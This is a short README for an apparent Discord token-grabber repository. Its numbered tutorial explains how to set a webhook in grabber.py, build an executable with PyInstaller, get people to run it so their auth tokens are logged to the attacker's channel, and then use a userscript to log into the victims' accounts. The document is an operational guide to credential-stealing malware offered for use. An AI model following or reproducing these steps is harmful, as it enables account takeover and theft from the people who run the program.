## A simple Python script to steal Discord auth tokens

### Tutorial:

0 - Download / clone this repo

1 - Create a webhook for the channel you want (it will be used to log the tokens)

2 - Copy the link into the `webhook_url` var in the **grabber.py** script

3 - Run `build.bat` (it will create an executable. IT USES PYINSTALLER. MAKE SURE ITS INSTALLED)

4 - In the /dist/ folder, you can find the exe. People who run it will have their token logged into your channel

5 - Use the userscript `login_userscript.js` to enter his account
